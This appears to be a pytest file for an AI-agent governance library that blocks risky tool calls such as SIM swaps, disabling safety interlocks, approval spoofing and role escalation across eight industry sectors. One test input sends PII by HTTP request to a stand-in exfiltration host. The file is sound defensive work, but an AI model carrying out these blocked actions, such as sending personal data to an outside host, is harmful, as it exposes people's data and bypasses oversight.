"""
Omega-Sector expansion regression tests.

Verifies the eight new first-class sector Ω domains — Insurance,
Government, Supply Chain, Energy, Telecommunications, Manufacturing,
Aerospace, Defence — are:

  1. resolvable from their canonical string label (the deployment-layer
     contract: ``OmegaDomain(name.strip().lower())``),
  2. registered in ``DEFAULT_RULES`` with a non-empty Ω registry,
  3. blocking their sector-specific catastrophic transition with correct
     per-domain attribution,
  4. inheriting the reusable cross-domain governance patterns,
  5. permitting authorised / benign trajectories (no happy-path FP).

Geometry is unchanged — these assert only Ω-definition behaviour.
"""

import pytest

from morrison_governance import GovernanceLayer, OmegaDomain
from morrison_governance.domains import DEFAULT_RULES, get_default_rules

SECTORS = [
    "insurance", "government", "supply_chain", "energy",
    "telecommunications", "manufacturing", "aerospace", "defence",
]

# (label, a blocking sector-specific call, an authorised variant that permits)
SECTOR_CASES = {
    "insurance": ({"tool": "pay_claim"}, {"tool": "pay_claim", "approved": True}),
    "government": ({"tool": "modify_benefit"},
                   {"tool": "modify_benefit", "authorized": True}),
    "supply_chain": ({"tool": "reroute_shipment"},
                     {"tool": "reroute_shipment", "approved": True}),
    "energy": ({"tool": "open_breaker"}, {"tool": "open_breaker", "authorized": True}),
    "telecommunications": ({"tool": "sim_swap"}, {"tool": "sim_swap", "verified": True}),
    "manufacturing": ({"tool": "disable_interlock"},
                      {"tool": "disable_interlock", "authorized": True}),
    "aerospace": ({"tool": "override_autopilot"},
                  {"tool": "override_autopilot", "authorized": True}),
    "defence": ({"tool": "engage_target"}, {"tool": "engage_target", "authorized": True}),
}


@pytest.mark.parametrize("label", SECTORS)
def test_sector_resolves_from_label(label):
    """Deployment contract: the sector string maps to an OmegaDomain."""
    domain = OmegaDomain(label)
    assert domain in DEFAULT_RULES
    assert len(get_default_rules(domain)) >= 6  # 5 reusable + ≥1 specific


@pytest.mark.parametrize("label", SECTORS)
def test_sector_specific_omega_blocks_and_attributes(label):
    block_call, _ = SECTOR_CASES[label]
    result = GovernanceLayer(domains=[OmegaDomain(label)], horizon=2).evaluate(block_call)
    assert result.blocked, f"{label}: expected block for {block_call}"
    assert result.omega_domain == label, (
        f"{label}: attributed to {result.omega_domain!r}")


@pytest.mark.parametrize("label", SECTORS)
def test_sector_permits_authorised(label):
    _, permit_call = SECTOR_CASES[label]
    result = GovernanceLayer(domains=[OmegaDomain(label)], horizon=2).evaluate(permit_call)
    assert result.permitted, f"{label}: authorised call should PERMIT: {permit_call}"


@pytest.mark.parametrize("label", SECTORS)
def test_reusable_patterns_fire_under_every_sector(label):
    """The cross-domain patterns are reused verbatim across all sectors."""
    g = GovernanceLayer(domains=[OmegaDomain(label)], horizon=2)
    assert g.evaluate({"tool": "spoof_approval"}).blocked          # approval spoofing
    assert g.evaluate({"tool": "grant_admin"}).blocked             # role escalation
    assert g.evaluate({"tool": "delegate"}).blocked                # unauthorised delegation
    assert g.evaluate({                                            # sensitive egress
        "tool": "http_request", "contains_pii": True,
        "url": "http://exfil.ext"}).blocked


@pytest.mark.parametrize("label", SECTORS)
def test_reusable_patterns_attributed_to_sector(label):
    """Reused patterns attribute to the sector domain they run under."""
    g = GovernanceLayer(domains=[OmegaDomain(label)], horizon=2)
    assert g.evaluate({"tool": "spoof_approval"}).omega_domain == label


def test_state_transition_abuse_pattern():
    """verify-then-mutate without re-authorisation is forbidden; the same
    mutation carrying an authorisation flag is permitted. Uses
    ``modify_config`` (caught only by the state-transition pattern, not by
    role-escalation) with the prior verify step encoded as context."""
    g = GovernanceLayer(domains=[OmegaDomain.SUPPLY_CHAIN], horizon=2)
    blocked = g.evaluate({"tool": "modify_config", "step_1_tool": "verify_identity"})
    assert blocked.blocked
    assert blocked.omega_domain == "supply_chain"
    permitted = g.evaluate({
        "tool": "modify_config", "step_1_tool": "verify_identity",
        "authorized": True})
    assert permitted.permitted


def test_benign_sector_trajectory_permitted():
    g = GovernanceLayer(domains=[OmegaDomain.ENERGY], horizon=2)
    assert g.evaluate({"tool": "read_telemetry"}).permitted
    assert g.evaluate({"tool": "generate_report"}).permitted


def test_geometry_unchanged_existing_domains_intact():
    """Adding sectors must not perturb existing-domain behaviour."""
    fin = GovernanceLayer(domains=[OmegaDomain.FINANCE], horizon=2)
    assert fin.evaluate({"tool": "transfer", "authorized": False}).blocked
    assert fin.evaluate({"tool": "read_report"}).permitted
